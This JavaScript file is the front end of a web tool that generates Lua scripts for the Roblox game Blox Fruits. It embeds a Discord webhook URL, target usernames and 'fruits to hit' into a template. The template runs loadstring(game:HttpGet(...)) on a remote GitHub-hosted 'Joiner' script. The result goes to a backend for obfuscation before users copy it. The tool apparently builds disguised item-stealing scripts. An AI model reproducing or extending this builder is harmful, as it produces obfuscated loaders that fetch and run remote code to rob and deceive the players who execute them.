document.addEventListener('DOMContentLoaded', () => {
    // --- DOM Elements ---
    const webhookUrlInput = document.getElementById('webhookUrl');
    const usernamesInput = document.getElementById('usernamesInput');
    const fruitCheckboxesContainer = document.getElementById('fruitCheckboxes');
    const generateButton = document.getElementById('generateButton');
    const outputScriptElement = document.getElementById('outputScript');
    const copyButton = document.getElementById('copyButton');
    const deselectAllButton = document.getElementById('deselectAllFruits');
    const errorMessagesDiv = document.getElementById('errorMessages');
    const outputSection = document.getElementById('outputSection');
    const loadingIndicator = document.getElementById('loadingIndicator');

    // --- Data: Fruits sorted by rarity ---
    // Using the full lists and preserving order within rarity groups

    const mythicalFruits = [
        // Order based on original list (likely value descending)
        "Kitsune-Kitsune", "Yeti-Yeti", "Gas-Gas", "Leopard-Leopard", "Control-Control",
        "Dough-Dough", "T-Rex-T-Rex", "Spirit-Spirit", "Mammoth-Mammoth", "Venom-Venom"
    ];

    const legendaryFruits = [
        // Order based on original list, NO alphabetical sort applied
        "Portal-Portal", "Buddha-Buddha", "Rumble-Rumble", "Shadow-Shadow", "Blizzard-Blizzard",
        "Sound-Sound", "Phoenix-Phoenix", "Pain-Pain", "Gravity-Gravity", "Love-Love",
        "Spider-Spider", "Quake-Quake"
    ]; // <-- Removed .sort() from here

    // Combine the arrays in desired rarity order
    const sortedFruitsByRarity = [...mythicalFruits, ...legendaryFruits];

    // Default selections (no change needed here, works by name)
    const defaultSelectedFruits = ["Kitsune-Kitsune", "Leopard-Leopard", "Yeti-Yeti", "Gas-Gas"];


    // --- Functions ---

    // Function to display error messages
    function displayError(message) {
        errorMessagesDiv.textContent = message;
        errorMessagesDiv.classList.remove('hidden');
        errorMessagesDiv.classList.add('block');
        // Scroll to the error message for visibility
        errorMessagesDiv.scrollIntoView({ behavior: 'smooth', block: 'center' });
    }

    // Function to clear error messages
    function clearErrors() {
        errorMessagesDiv.textContent = '';
        errorMessagesDiv.classList.add('hidden');
        errorMessagesDiv.classList.remove('block');
    }

    // Function to populate fruit checkboxes (uses the updated sortedFruitsByRarity)
    function populateFruitCheckboxes() {
        fruitCheckboxesContainer.innerHTML = ''; // Clear loading message
        sortedFruitsByRarity.forEach(fruitName => {
            const checkboxId = `fruit-${fruitName.replace(/[^a-zA-Z0-9]/g, '-')}`;
            const label = document.createElement('label');
            label.htmlFor = checkboxId;
            label.className = 'text-sm text-gray-700'; // Tailwind class from container style

            const checkbox = document.createElement('input');
            checkbox.type = 'checkbox';
            checkbox.id = checkboxId;
            checkbox.name = 'fruit';
            checkbox.value = fruitName;
            // checkbox.className = 'mr-2 accent-indigo-600'; // Tailwind class from container style

            if (defaultSelectedFruits.includes(fruitName)) {
                checkbox.checked = true;
            }

            const span = document.createElement('span');
            span.textContent = fruitName;
            // Add bold styling if checked
            if (checkbox.checked) {
                span.classList.add('font-semibold');
            }
            // Add event listener to toggle font weight on change
            checkbox.addEventListener('change', (event) => {
                span.classList.toggle('font-semibold', event.target.checked);
            });

            label.appendChild(checkbox);
            label.appendChild(span);
            fruitCheckboxesContainer.appendChild(label);
        });
    }

    // Function to validate user inputs (UPDATED REGEX)
    function validateInputs() {
        const webhookUrl = webhookUrlInput.value.trim();
        const usernamesRaw = usernamesInput.value.trim();
        // --- UPDATED Regex: Allows both discord.com and discordapp.com ---
        const discordWebhookRegex = /^https:\/\/discord(?:app)?\.com\/api\/webhooks\/\d+\/[a-zA-Z0-9_-]+$/;

        // 1. Check Webhook URL
        if (!webhookUrl) {
            displayError("Error: Discord Webhook URL cannot be empty.");
            webhookUrlInput.focus();
            return false;
        }
        // Use the updated regex for testing
        if (!discordWebhookRegex.test(webhookUrl)) {
            displayError("Error: Invalid Discord Webhook URL format (must start with https://discord.com/ or https://discordapp.com/).");
            webhookUrlInput.focus();
            return false;
        }

        // 2. Check Usernames
        if (!usernamesRaw) {
            displayError("Error: Usernames list cannot be empty.");
            usernamesInput.focus();
            return false;
        }
        const usernamesArray = usernamesRaw
            .split('\n')
            .map(name => name.trim())
            .filter(name => name !== ''); // Remove empty lines

        if (usernamesArray.length === 0) {
            displayError("Error: Please enter at least one valid username.");
            usernamesInput.focus();
            return false;
        }
        for (const username of usernamesArray) {
            if (/\s/.test(username)) { // Check for any whitespace
                displayError(`Error: Username "${username}" contains spaces, which are not allowed.`);
                usernamesInput.focus();
                return false;
            }
        }

        // All checks passed
        return true;
    }

    // Function to generate the base Lua script string
    function generateBaseScript() {
        const webhookUrl = webhookUrlInput.value.trim();
        const usernamesRaw = usernamesInput.value.trim();

        // Process usernames into Lua table format
        const usernamesArray = usernamesRaw
            .split('\n')
            .map(name => name.trim())
            .filter(name => name !== '');
        const usernamesLuaTable = usernamesArray.map(name => `"${name}"`).join(', ');

        // Get selected fruits
        const selectedFruits = [];
        const checkedBoxes = document.querySelectorAll('input[name="fruit"]:checked');
        checkedBoxes.forEach(checkbox => {
            selectedFruits.push(`"${checkbox.value}"`); // Add quotes for Lua string format
        });
        const fruitsLuaTable = selectedFruits.join(', ');

        // Construct the script template
        const baseScript = `Webhook = "${webhookUrl}" -- Webhook URL
Usernames = {${usernamesLuaTable}} -- Usernames
FruitsToHit = {${fruitsLuaTable}} -- Fruits to detect

-- Load the main script (example placeholder)
loadstring(game:HttpGet("https://raw.githubusercontent.com/SharkyScriptz/Joiner/refs/heads/main/V3"))()`;

        return baseScript;
    }

    // Function to handle copy to clipboard
    function copyScriptToClipboard() {
        const scriptToCopy = outputScriptElement.textContent;
        navigator.clipboard.writeText(scriptToCopy).then(() => {
            copyButton.textContent = 'Copied!';
            copyButton.classList.replace('bg-green-600', 'bg-green-500');
            copyButton.classList.replace('hover:bg-green-700', 'hover:bg-green-600');
            setTimeout(() => {
                copyButton.textContent = 'Copy to Clipboard';
                copyButton.classList.replace('bg-green-500', 'bg-green-600');
                copyButton.classList.replace('hover:bg-green-600', 'hover:bg-green-700');
            }, 2000);
        }).catch(err => {
            console.error('Failed to copy text: ', err);
            displayError('Failed to copy script to clipboard.');
        });
    }

    // Function to select/deselect all fruit checkboxes
    function setAllFruitCheckboxes(checkedState) {
        const checkboxes = document.querySelectorAll('input[name="fruit"]');
        checkboxes.forEach(checkbox => {
            checkbox.checked = checkedState;
            // Update label style
            const span = checkbox.nextElementSibling; // Assumes span is directly after input
            if (span) {
                span.classList.toggle('font-semibold', checkedState);
            }
        });
    }

    // --- Event Listeners ---

    // Generate Button Click Handler
    generateButton.addEventListener('click', async () => {
        clearErrors();
        outputSection.classList.add('hidden'); // Hide previous output
        outputScriptElement.textContent = '-- Your processed script will appear here...'; // Reset placeholder
        copyButton.textContent = 'Copy to Clipboard'; // Reset copy button text
        copyButton.classList.remove('bg-green-500', 'hover:bg-green-600'); // Ensure button is not stuck in 'Copied!' state visually
        copyButton.classList.add('bg-green-600', 'hover:bg-green-700');


        // 1. Validate Inputs
        if (!validateInputs()) { // Uses updated validation
            return; // Stop if validation fails
        }

        // 2. Generate Base Script
        const baseScript = generateBaseScript();
        // console.log("Base script generated:\n", baseScript); // For debugging

        // 3. Show Loading Indicator
        loadingIndicator.classList.remove('hidden');
        generateButton.disabled = true; // Disable button during processing

        // 4. Call Backend for Obfuscation
        try {
            // Define the API endpoint for your Cloudflare Worker
            // Use '/api/mock-obfuscate' for deployment, or 'http://localhost:8787/api/mock-obfuscate' for local testing
            const apiEndpoint = '/api/mock-obfuscate'; // <-- CHANGE THIS BACK for deployment vs local test if needed

            console.log(`Sending script to backend: ${apiEndpoint}`);

            const response = await fetch(apiEndpoint, {
                method: 'POST',
                headers: {
                    'Content-Type': 'text/plain', // Sending as plain text
                },
                body: baseScript // Send the generated Lua script string
            });

            console.log(`Received response status: ${response.status}`);

            if (!response.ok) {
                // Try to get error message from backend response body
                let errorMsg = `Error processing script: ${response.status} ${response.statusText}`;
                try {
                    const errorBody = await response.text();
                    if (errorBody) {
                       errorMsg += `\nServer response: ${errorBody.substring(0, 500)}${errorBody.length > 500 ? '...' : ''}`;
                    }
                } catch (_) { /* Ignore if reading body fails */ }
                throw new Error(errorMsg); // Throw error to be caught below
            }

            // Get the processed script from the response body
            const processedScript = await response.text();

            // 5. Display Result
            outputScriptElement.textContent = processedScript; // Display the result
            outputSection.classList.remove('hidden'); // Show the output section
            copyButton.style.display = 'inline-block'; // Ensure copy button is visible

        } catch (error) {
            console.error("Processing error:", error);
            // Display a user-friendly error message
            // The "Failed to fetch" message often indicates the backend worker isn't running or reachable at the apiEndpoint URL
            displayError(`Failed to process script. ${error.message}. Please ensure the backend worker is running and the API endpoint URL is correct.`);
            outputSection.classList.add('hidden'); // Hide output section on error
        } finally {
            // 6. Hide Loading Indicator and Re-enable Button
            loadingIndicator.classList.add('hidden');
            generateButton.disabled = false;
        }
    });

    // Deselect All Button
    deselectAllButton.addEventListener('click', () => setAllFruitCheckboxes(false));

    // Copy Button
    copyButton.addEventListener('click', copyScriptToClipboard);


    // --- Initialization ---
    populateFruitCheckboxes(); // Create the fruit checkboxes on page load

});
